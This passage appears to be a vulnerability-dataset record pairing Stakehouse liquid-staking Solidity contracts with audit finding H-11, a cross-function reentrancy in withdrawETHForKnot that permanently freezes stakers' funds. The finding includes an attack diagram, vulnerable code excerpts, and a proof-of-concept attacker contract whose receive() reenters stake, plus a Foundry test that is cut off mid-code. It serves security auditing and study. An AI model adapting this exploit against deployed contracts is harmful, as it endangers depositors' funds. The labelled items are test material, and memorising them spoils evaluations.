address _lpTokenFactory,\n        address _brand,\n        address _savETHVaultDeployer,\n        address _stakingFundsVaultDeployer,\n        address _optionalGatekeeperDeployer,\n        uint256 _optionalCommission,\n        bool _deployOptionalGatekeeper,\n        string calldata _stakehouseTicker\n    ) external;\n\n    /// @notice function to check valid BLS public key for LSD network\n    /// @param _blsPublicKeyOfKnot BLS public key to check validity for\n    /// @return true if BLS public key is a part of LSD network, false otherwise\n    function isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) external view returns (bool);\n\n    /// @notice function to check if BLS public key registered with the network or has been withdrawn before staking\n    /// @param _blsPublicKeyOfKnot BLS public key to check validity for\n    /// @return true if BLS public key is banned, false otherwise\n    function isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) external view returns (bool);\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\nimport { GiantSavETHVaultPool } from \"../../liquid-staking/GiantSavETHVaultPool.sol\";\nimport { LSDNFactory } from \"../../liquid-staking/LSDNFactory.sol\";\n\ncontract MockGiantSavETHVaultPool is GiantSavETHVaultPool {\n\n    IERC20 dETHToken;\n\n    constructor(\n        LSDNFactory _factory,\n        IERC20 _dETH\n    ) GiantSavETHVaultPool(_factory) {\n        dETHToken = _dETH;\n    }\n\n    /// ----------------------\n    /// Override Solidity API\n    /// ----------------------\n\n    function getDETH() internal view override returns (IERC20 dETH) {\n        return dETHToken;\n    }\n}\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Strings } from \"@openzeppelin/contracts/utils/Strings.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\n\n/// @dev For pools accepting ETH for validator staking, this contract will manage issuing LPs for deposits\nabstract contract ETHPoolLPFactory is StakehouseAPI {\n\n    /// @notice signalize withdrawing of ETH by depositor\n    event ETHWithdrawnByDepositor(address depositor, uint256 amount);\n\n    /// @notice signalize burning of LP token\n    event LPTokenBurnt(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n\n    /// @notice signalize issuance of new LP token\n    event NewLPTokenIssued(bytes blsPublicKeyOfKnot, address token, address firstDepositor, uint256 amount);\n\n    /// @notice signalize issuance of existing LP token\n    event LPTokenMinted(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n\n    /// @dev Base name and symbol used for deploying new LP tokens per KNOT\n    string internal baseLPTokenName;\n    string internal baseLPTokenSymbol;\n\n    /// @notice count of unique LP tokens issued for ETH deposits\n    uint256 public numberOfLPTokensIssued;\n\n    /// @notice Maximum amount that can be staked per validator in WEI\n    uint256 public maxStakingAmountPerValidator;\n\n    /// @notice Minimum amount that can be staked per validator in WEI\n    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;\n\n    /// @notice Factory for the deployment of KNOT<>LP Tokens that can be used to redeem dETH\n    LPTokenFactory public lpTokenFactory;\n\n    /// @notice LP token address deployed for a KNOT's BLS public key\n    mapping(bytes => LPToken) public lpTokenForKnot;\n\n    /// @notice KNOT BLS public key associated with the LP token\n    mapping(LPToken => bytes) public KnotAssociatedWithLPToken;\n\n    /// @notice Allow users to rotate the ETH from many LP to another in the event that a BLS key is never staked\n    /// @param _oldLPTokens Array of old LP tokens to be burnt\n    /// @param _newLPTokens Array of new LP tokens to be minted in exchange of old LP tokens\n    /// @param _amounts Array of amount of tokens to be exchanged\n    function batchRotateLPTokens(\n        LPToken[] calldata _oldLPTokens,\n        LPToken[] calldata _newLPTokens,\n        uint256[] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _oldLPTokens.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n\n        for (uint256 i; i < numOfRotations; ++i) {\n            rotateLPTokens(\n                _oldLPTokens[i],\n                _newLPTokens[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked\n    /// @param _oldLPToken Instance of the old LP token (to be burnt)\n    /// @param _newLPToken Instane of the new LP token (to be minted)\n    /// @param _amount Amount of LP tokens to be rotated/converted from old to new\n    function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {\n        require(address(_oldLPToken) != address(0), \"Zero address\");\n        require(address(_newLPToken) != address(0), \"Zero address\");\n        require(_oldLPToken != _newLPToken, \"Incorrect rotation to same token\");\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _oldLPToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Liquidity is still fresh\");\n        require(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\");\n\n        bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];\n        bytes memory blsPublicKeyOfNewKnot = KnotAssociatedWithLPToken[_newLPToken];\n\n        require(blsPublicKeyOfPreviousKnot.length == 48, \"Incorrect BLS public key\");\n        require(blsPublicKeyOfNewKnot.length == 48, \"Incorrect BLS public key\");\n\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfNewKnot) ==IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        // burn old tokens and mint new ones\n        _oldLPToken.burn(msg.sender, _amount);\n        emit LPTokenBurnt(blsPublicKeyOfPreviousKnot, address(_oldLPToken), msg.sender, _amount);\n\n        _newLPToken.mint(msg.sender, _amount);\n        emit LPTokenMinted(KnotAssociatedWithLPToken[_newLPToken], address(_newLPToken), msg.sender, _amount);\n    }\n\n    /// @dev Internal business logic for processing staking deposits for single or batch deposits\n    function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Min amount not reached\");\n        require(_blsPublicKeyOfKnot.length == 48, \"Invalid BLS public key\");\n\n        // LP token issued for the KNOT\n        // will be zero for a new KNOT because the mapping doesn't exist\n        LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if(address(lpToken) != address(0)) {\n            // KNOT and it's LP token is already registered\n            // mint the respective LP tokens for the user\n\n            // total supply after minting the LP token must not exceed maximum staking amount per validator\n            require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n\n            // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n            lpToken.mint(msg.sender, _amount);\n            emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);\n        }\n        else {\n            // check that amount doesn't exceed max staking amount per validator\n            require(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n            \n            // mint new LP tokens for the new KNOT\n            // add the KNOT in the mapping\n            string memory tokenNumber = Strings.toString(numberOfLPTokensIssued);\n            string memory tokenName = string(abi.encodePacked(baseLPTokenName, tokenNumber));\n            string memory tokenSymbol = string(abi.encodePacked(baseLPTokenSymbol, tokenNumber));\n\n            // deploy new LP token and optionally enable transfer notifications\n            LPToken newLPToken = _enableTransferHook ?\n                             LPToken(lpTokenFactory.deployLPToken(address(this), address(this), tokenSymbol, tokenName)) :\n                             LPToken(lpTokenFactory.deployLPToken(address(this), address(0), tokenSymbol, tokenName));\n\n            // increase the count of LP tokens\n            numberOfLPTokensIssued++;\n\n            // register the BLS Public Key with the LP token\n            lpTokenForKnot[_blsPublicKeyOfKnot] = newLPToken;\n            KnotAssociatedWithLPToken[newLPToken] = _blsPublicKeyOfKnot;\n\n            // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n            newLPToken.mint(msg.sender, _amount);\n            emit NewLPTokenIssued(_blsPublicKeyOfKnot, address(newLPToken), msg.sender, _amount);\n        }\n    }\n}\n\n",
        "CodeNames": [
            "GiantMevAndFeesPool.sol",
            "LiquidStakingManager.sol",
            "ILiquidStakingManager.sol",
            "MockGiantSavETHVaultPool.sol",
            "ETHPoolLPFactory.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-11",
                "Location": [
                    "\n    function testLockStakersFunds() public {\n        uint256 startAmount = 8 ether;\n        // Create NodeRunner. Constructor registers two BLS Keys\n        address nodeRunner = address(new NodeRunner{value: startAmount}(manager, blsPubKeyOne, blsPubKeyTwo, address(this)));\n        \n        // Simulate state transitions in lifecycle status to initials registered (value of 1)\n        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);\n\n        // savETHUser, feesAndMevUser funds used to deposit into validator BLS key #1\n        address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);\n        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n        \n        // deposit savETHUser, feesAndMevUser funds for validator #1\n        depositIntoDefaultSavETHVault(savETHUser, blsPubKeyOne, 24 ether);\n        depositIntoDefaultStakingFundsVault(feesAndMevUser, blsPubKeyOne, 4 ether);\n\n        // withdraw ETH for first BLS key and reenter\n        // This will perform a cross-function reentracy to call stake\n        vm.startPrank(nodeRunner);\n        manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);\n        // Simulate state transitions in lifecycle status to ETH deposited (value of 2)\n        // In real deployment, when stake is called TransactionRouter.registerValidator is called to change the state to DEPOSIT_COMPLETE \n        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 2);\n        vm.stopPrank();\n        \n        // Validate mintDerivatives reverts because of banned public key \n        (,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();\n        (,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();\n        vm.expectRevert(\"BLS public key is banned or not a part of LSD network\");\n        manager.mintDerivatives(\n            getBytesArrayFromBytes(blsPubKeyOne),\n            reports,\n            sigs\n        );\n\n        // Validate depositor cannot burn LP tokens\n        vm.startPrank(savETHUser);\n        vm.expectRevert(\"Cannot burn LP tokens\");\n        savETHVault.burnLPTokensByBLS(getBytesArrayFromBytes(blsPubKeyOne), getUint256ArrayFromValues(24 ether));\n        vm.stopPrank();\n    }\n\n"
                ],
                "Type": " Protocol insolvent - Permanent freeze of funds",
                "Description": "*Submitted by 0xdeadbeef0x(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176), also found by joestakey(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/436)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524<br\n\n*   Permanent freeze of funds users who deposited ETH for staking will not be able to receive their funds, rewards or rotate to another token. The protocol becomes insolvent, it cannot pay anything to the users.\n*   Protocol's LifecycleStatus state machine is broken\n\nOther impacts:\n\n*   Users deposit funds to an unstakable validator (node runner has already took out his funds)\n\nImpact is also on the Giant Pools that give liquidity to the vaults.\n\nA competitor or malicious actor can cause bad PR for the protocol by causing permanent freeze of user funds at LSD stakehouse.\n\n\nThere are two main bugs that cause the above impact:\n\n1.  Reentrancy bug in withdrawETHForKnot function in LiquidStakingManager.sol\n2.  Improper balance check in LiquidStakingManager.sol for deposited node runner funds.\n\nFor easier reading and understanding, please follow the below full attack flow diagram when reading through the explanation.\n\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510               \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502           \u2502               \u2502           \u2502            \u2502           \u2502              \u2502           \u2502\n    \u2502Node Runner\u2502               \u2502LSD Manager\u2502            \u2502   Vaults  \u2502              \u2502   Users   \u2502\n    \u2502           \u2502               \u2502           \u2502            \u2502           \u2502              \u2502           \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518               \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518            \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518              \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n          \u2502                           \u2502                        \u2502                          \u2502\n          \u2502   Register BLS Key #1     \u2502                        \u2502                          \u2502\n          \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                        \u2502                          \u2502\n          \u2502                           \u2502                        \u2502                          \u2502\n          \u2502   Register BLS Key #1     \u2502                        \u2502                          \u2502\n          \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                        \u2502Deposit 24 ETH to savETH  \u2502\n          \u2502                           \u2502                        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n          \u2502                           \u2502                        \u2502                          \u2502\n          \u2502                           \u2502                        \u2502Deposit 4 ETH to mevAndFees\n          \u2502                           \u2502                        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n          \u2502WithdrawETHForKnot BLS #1  \u2502                        \u2502                          \u2502\n          \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                        \u2502                          \u2502\n          \u2502       Send 4 ETH          \u2502                        \u2502                          \u2502\n          \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                        \u2502                          \u2502\n          \u2502 Reenter stake function    \u2502                        \u2502                          \u2502\n          \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502Get 28 ETH from vaults  \u2502                          \u2502\n          \u2502                           \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                          \u2502\n          \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502     Send 28 ETH        \u2502                          \u2502\n          \u2502 \u2502 Stake complete.       \u2502 \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                          \u2502\n          \u2502 \u2502status=DEPOSIT_COMPLETE\u2502 \u2502                        \u2502                          \u2502\n          \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502                        \u2502                          \u2502\n          \u2502Finished WithdrawETHForKnot\u2502                        \u2502                          \u2502\n          \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                        \u2502Users cannot mint derivati\u2502es\n          \u2502                           \u2502                        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n          \u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u2502                        \u2502Users cannot burnLPTokens \u2502\n          \u2502    \u2502BLS Key #1 banned \u2502   \u2502                        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n          \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502                        \u2502Users cannot rotateTokens \u2502\n          \u2502                           \u2502                        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n          \u2502                           \u2502                        \u2502                          \u2502\n\nLet's assume the following starting point:\n\n1.  Node runner registered and paid 4 ETH for BLS KEY #1\n2.  Node runner registered and paid 4 ETH for BLS KEY #2\n3.  savETH users collected 24 ETH ready for staking\n4.  mevAndFess users collected 4 ETH ready for staking\n\nReentrancy in withdrawETHForKnot:\n\nwithdrawETHForKnot is a function used in LiquidStakingManager. It is used to refund a node runner if funds are not yet staked and BAN the BLS key.\n\nwithdrawETHForKnot:<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326\n\n        function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n    ....\n            IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n                _recipient,\n                \"\",\n                4 ether\n            );\n    ....\n            bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n        }\n\nThe associatedSmartWallet will send the node runner 4 ETH (out of 8 currently in balance).\n\nPlease note:\n\n1.  The Node Runner can reenter the LiquidStakingManager when receiving the 4 ETH\n2.  bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet; is only executed after the reentrancy\n\nWe can call any method we need with the following states:\n\n*   BLS key is NOT banned\n*   Status is IDataStructures.LifecycleStatus.INITIALS_REGISTERED\n\nThe node runner will call the stake function to stake the deposited funds from the vaults and change the status to IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE\n\nstake:<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524\n\n        function stake(\n            bytes[] calldata _blsPublicKeyOfKnots,\n            bytes[] calldata _ciphertexts,\n            bytes[] calldata _aesEncryptorKeys,\n            IDataStructures.EIP712Signature[] calldata _encryptionSignatures,\n            bytes32[] calldata _dataRoots\n        ) external {\n    ....\n                // check if BLS public key is registered with liquid staking derivative network and not banned\n                require(isBLSPublicKeyBanned(blsPubKey) == false, \"BLS public key is banned or not a part of LSD network\");\n    ....\n                require(\n                    getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                    \"Initials not registered\"\n                );\n    ....\n                _assertEtherIsReadyForValidatorStaking(blsPubKey);\n\n                _stake(\n                    _blsPublicKeyOfKnots[i],\n                    _ciphertexts[i],\n                    _aesEncryptorKeys[i],\n                    _encryptionSignatures[i],\n                    _dataRoots[i]\n                );\n    ....\n        }\n\nThe stake function checks\n\n1.  That the BLS key is not banned. In our case its not yet banned, because the banning happens after the reentrancy\n2.  IDataStructures.LifecycleStatus.INITIALS_REGISTERED is the current Lifecycle status. Which it is.\n3.  There is enough balance in the vaults and node runners smart wallet in _assertEtherIsReadyForValidatorStaking\n\n_assertEtherIsReadyForValidatorStaking  checks that the node runners smart wallet has more than 4 ETH.\nBecause our node runner has two BLS keys registered, there is an additional 4 ETH on BLS Key #2 and the conditions will pass.\n\n_assertEtherIsReadyForValidatorStaking<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934\n\n        function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {\n            address associatedSmartWallet = smartWalletOfKnot[blsPubKey];\n            require(associatedSmartWallet.balance = 4 ether, \"Smart wallet balance must be at least 4 ether\");\n\n            LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);\n            require(address(stakingFundsLP) != address(0), \"No funds staked in staking funds vault\");\n            require(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");\n\n            LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);\n            require(address(savETHVaultLP) != address(0), \"No funds staked in savETH vault\");\n            require(savETHVaultLP.totalSupply() == 24 ether, \"KNOT must have 24 ETH in savETH vault\");\n        }\n\nSince we can pass all checks. _stake will be called which withdraws all needed funds from the vault and executes a call through the smart wallet to the TransactionRouter with 32 ETH needed for the stake. The TransactionRouter will process the funds and stake them. The LifecycleStatus will be updated to IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE\n\n_stake:<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L739\n\n        function _stake(\n            bytes calldata _blsPublicKey,\n            bytes calldata _cipherText,\n            bytes calldata _aesEncryptorKey,\n            IDataStructures.EIP712Signature calldata _encryptionSignature,\n            bytes32 dataRoot\n        ) internal {\n            address smartWallet = smartWalletOfKnot[_blsPublicKey];\n\n            // send 24 ether from savETH vault to smart wallet\n            savETHVault.withdrawETHForStaking(smartWallet, 24 ether);\n\n            // send 4 ether from DAO staking funds vault\n            stakingFundsVault.withdrawETH(smartWallet, 4 ether);\n\n            // interact with transaction router using smart wallet to deposit 32 ETH\n            IOwnableSmartWallet(smartWallet).execute(\n                address(getTransactionRouter()),\n                abi.encodeWithSelector(\n                    ITransactionRouter.registerValidator.selector,\n                    smartWallet,\n                    _blsPublicKey,\n                    _cipherText,\n                    _aesEncryptorKey,\n                    _encryptionSignature,\n                    dataRoot\n                ),\n                32 ether\n            );\n    ....\n        }\n\nAfter _stake and stake will finish executing we will finish the Cross-Function Reentrancy.\n\nThe protocol has entered the following state for the BLS key #1:\n\n1.  BLS Key #1 is banned\n2.  LifecycleStatus is IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE\n\nIn such a state where the key is banned, no one can mint derivatives and therefor depositors cannot withdraw rewards/dETH:\n\nmintDerivatives:<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L577\n\n        function mintDerivatives(\n            bytes[] calldata _blsPublicKeyOfKnots,\n            IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,\n            IDataStructures.EIP712Signature[] calldata _reportSignatures\n        ) external {\n    ....\n                // check if BLS public key is registered and not banned\n                require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is banned or not a part of LSD network\");\n    ....\n\nVault LP Tokens cannot be burned for withdraws because that is not supported in DEPOSIT_COMPLETE state:\n\nburnLPToken:<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126\n\n        function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {\n    ...\n            bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];\n            IDataStructures.LifecycleStatus validatorStatus = getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot);\n\n            require(\n                validatorStatus == IDataStructures.LifecycleStatus.INITIALS_REGISTERED ||\n                validatorStatus == IDataStructures.LifecycleStatus.TOKENS_MINTED,\n                \"Cannot burn LP tokens\"\n            );\n    ....\n\nTokens cannot be rotated to other LP tokens because that is not supported in a DEPOSIT_COMPLETE state\n\nrotateLPTokens\n\n        function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {\n    ...\n            bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];\n    ...\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Lifecycle status must be one\"\n            );\n    ...\n\nFunds are stuck, they cannot be taken or used.<br\nThe LifecycleStatus is also stuck, tokens cannot be minted.\n\n\nThe POC will showcase the scenario in the diagram.\n\nAdd the following contracts to liquid-staking folder:<br\n<https://github.com/coade-423n4/2022-11-stakehouse/tree/main/contracts/testing/liquid-staking\n\n    // SPDX-License-Identifier: MIT\n\n    pragma solidity 0.8.13;\n\n    import { LiquidStakingManager } from \"../../liquid-staking/LiquidStakingManager.sol\";\n    import { TestUtils } from \"../../../test/utils/TestUtils.sol\";\n\n    contract NodeRunner {\n        bytes blsPublicKey1;\n        LiquidStakingManager manager;\n        TestUtils testUtils;\n\n        constructor(LiquidStakingManager _manager, bytes memory _blsPublicKey1, bytes memory _blsPublicKey2, address _testUtils) payable public {\n            manager = _manager;\n            blsPublicKey1 = _blsPublicKey1;\n            testUtils = TestUtils(_testUtils);\n            //register BLS Key #1\n            manager.registerBLSPublicKeys{ value: 4 ether }(\n                testUtils.getBytesArrayFromBytes(blsPublicKey1),\n                testUtils.getBytesArrayFromBytes(blsPublicKey1),\n                address(0xdeadbeef)\n            );\n            // Register BLS Key #2\n            manager.registerBLSPublicKeys{ value: 4 ether }(\n                testUtils.getBytesArrayFromBytes(_blsPublicKey2),\n                testUtils.getBytesArrayFromBytes(_blsPublicKey2),\n                address(0xdeadbeef)\n            );\n        }\n        receive() external payable {\n            testUtils.stakeSingleBlsPubKey(blsPublicKey1);\n        }\n    }\n\nAdd the following imports to LiquidStakingManager.t.sol<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12\n\n    import { NodeRunner } from \"../../contracts/testing/liquid-staking/NodeRunner.sol\";\n    import { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nAdd the following test to LiquidStakingManager.t.sol<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L121\n\n\n    function testLockStakersFunds() public {\n        uint256 startAmount = 8 ether;\n        // Create NodeRunner. Constructor registers two BLS Keys\n        address nodeRunner = address(new NodeRunner{value: startAmount}(manager, blsPubKeyOne, blsPubKeyTwo, address(this)));\n        \n        // Simulate state transitions in lifecycle status to initials registered (value of 1)\n        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);\n\n        // savETHUser, feesAndMevUser funds used to deposit into validator BLS key #1\n        address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);\n        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n        \n        // deposit savETHUser, feesAndMevUser funds for validator #1\n        depositIntoDefaultSavETHVault(savETHUser, blsPubKeyOne, 24 ether);\n        depositIntoDefaultStakingFundsVault(feesAndMevUser, blsPubKeyOne, 4 ether);\n\n        // withdraw ETH for first BLS key and reenter\n        // This will perform a cross-function reentracy to call stake\n        vm.startPrank(nodeRunner);\n        manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);\n        // Simulate state transitions in lifecycle status to ETH deposited (value of 2)\n        // In real deployment, when stake is called TransactionRouter.registerValidator is called to change the state to DEPOSIT_COMPLETE \n        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 2);\n        vm.stopPrank();\n        \n        // Validate mintDerivatives reverts because of banned public key \n        (,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();\n        (,IDataStructures.EIP712Signature[] 